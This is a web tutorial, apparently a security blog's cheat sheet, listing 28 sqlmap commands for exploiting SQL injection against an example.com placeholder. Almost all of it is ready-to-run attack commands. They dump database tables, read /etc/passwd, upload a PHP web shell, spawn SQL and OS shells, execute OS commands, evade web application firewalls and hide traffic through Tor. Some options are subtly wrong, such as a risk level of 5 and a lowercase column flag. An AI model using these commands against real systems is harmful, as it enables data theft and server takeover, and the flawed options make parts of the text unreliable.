# Top SQLMAP Commands For Exploitation of SQL Injection


![sqlmap commands tech hyme](https://techhyme.com/wp-content/uploads/2021/06/sqlmap-commands-tech-hyme.jpg)

Structured Query Language, which is better known as SQL, is the underlining common programing language that is understood by most database management systems. It provides a common way for application to access the data in the database by using a common set of commands the database can understand.

Attackers exploit these databases by making them output information that they should not be displaying. Sometimes this is as simple as the attacker asking for privileged information from the [database management system](https://www.appdynamics.com/topics/database-management-systems). Other times, it is taking advantage of poor configurations by database administrators.

_**Also Read:**_

-   [From Reconnaissance to Covering Tracks – 5 Phases of Ethical Hacking](https://techhyme.com/from-reconnaissance-to-covering-tracks-5-phases-of-ethical-hacking/)
-   [A to Z – Web Vulnerabilities Index – OWASP Standard](https://techhyme.com/a-to-z-web-vulnerabilities-index-owasp-standard/)
-   [A to Z – Cyber Security Tools Collection](https://techhyme.com/a-to-z-cyber-security-tools-collection/)

Attackers may also take advantage of a vulnerability in the database management system that allows the attacker to view or write privileged commands to and from the database.

Sqlmap automates the process of detecting and exploiting SQL injection vulnerability and taking over of database servers. Sqlmap comes with a detection engine, as well as a broad range of [Penetration Testing](https://techhyme.com/10-step-penetration-testing-methodology-a-detailed-guide/) (PT) features that range from DB fingerprinting to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

The basic syntax to use Sqlmap is:

> sqlmap -u URL – – function

_Below is the list of most useful important SQLMAP Commands which you can use against your vulnerable target:_

**1. GET Request**

```bash
sqlmap -u http://example.com/page.php?id=1 --dbs
```

**2. From File**

```bash
sqlmap -r request.txt
```

**3. Testing with pattern of URL’s**

```bash
sqlmap -u http://example.com/page/*/view --dbs
```

**4. POST Request**

```bash
sqlmap -u http://example.com/login.php --data "username=admin&pass=admin&submit=submit" -p username
```

**5. Using Cookies**

```bash
sqlmap -u http://example.com/enter.php --cookie="PHPSESSID=45634b63g643f563456g4356g" -u http://example.com/index.php?id=1
```

**6. Extract Databases (DB Enumeration)**

```bash
sqlmap -u http://example.com/page.php?id=1 --dbs
```

**7. Identify Current DB**

```bash
sqlmap -u http://example.com/page.php?id=1 --current-db
```

**8. Extract Tables**

```bash
sqlmap -u http://example.com/page.php?id=1 -D database --tables
```

**9. Extract Columns**

```bash
sqlmap -u http://example.com/page.php?id=1 -D database -T table_name --columns
```

**10. Dumping Data**

```bash
sqlmap -u http://example.com/page.php?id=1 -D database -T table_name -C colum1,column2 --dump
```

**11. Multithreading**

```bash
sqlmap -u http://example.com/page.php?id=1 --dbs --threads 5
```

**12. Null-Connection**

```bash
sqlmap -u http://example.com/page.php?id=1 --dbs --null-connection
```

**13. HTTP Persistant Connection**

```bash
sqlmap -u http://example.com/page.php?id=1 --dbs --keep-alive
```

**14. Output prediction**

```bash
sqlmap -u http://example.com/page.php?id=1 -D database -T user -c users,password --dump --predict-output
```

**15. Checking privilages**

```bash
sqlmap -u http://example.com/page.php?id=1 --privileges
```

**16. Reading Files from the server**

```bash
sqlmap -u http://example.com/page.php?id=1 --file-read=/etc/passwd
```

**17. Uploading Files/Shell**

```bash
sqlmap -u http://example.com/page.php?id=1 --file-write=/root/shell.php --file-dest=/var/www/shell.php
```

**18. SQL Shell**

```bash
sqlmap -u http://example.com/page.php?id=1 --sql-shell
```

**19. OS shell**

```bash
sqlmap -u http://example.com/page.php?id=1 --os-shell
```

**20. OS Command Exe without Shell Upload**

```bash
sqlmap -u http://example.com/page.php?id=1 --os-cmd "uname -a"
```

**21. Using Proxy**

```bash
sqlmap --proxy="127.0.0.1:8080" -u http://example.com/page.php?id=1 --dbs
```

**22. Using Proxy with Credentials**

```bash
sqlmap -–proxy="127.0.0.1:8080" –-proxy-cred=username:password -u http://example.com/page.php?id=1
```

**23. Crawling**

```bash
sqlmap -u http://example.com/ --crawl=1
```

**24. Exploitation in Verbose Mode**

```bash
sqlmap -u http://example.com/page.php?id=1 -v 3
```

**25. Bypassing WAF (Web Application Firewall)**

```bash
sqlmap -u http://example.com/page.php?id=1 --tamper=apostrophemask
```

**26. Scanning Key Based Authentication Page**

```bash
sqlmap -u http://example.com/page.php?id=1 --auth-file=
```

**27. To use default TOR Network**

```bash
sqlmap -u http://example.com/page.php?id=1 --tor
```

**28. Scanning with High Risk and Level**

```bash
sqlmap -u http://example.com/page.php?id=1 --level=3 --risk=5
```
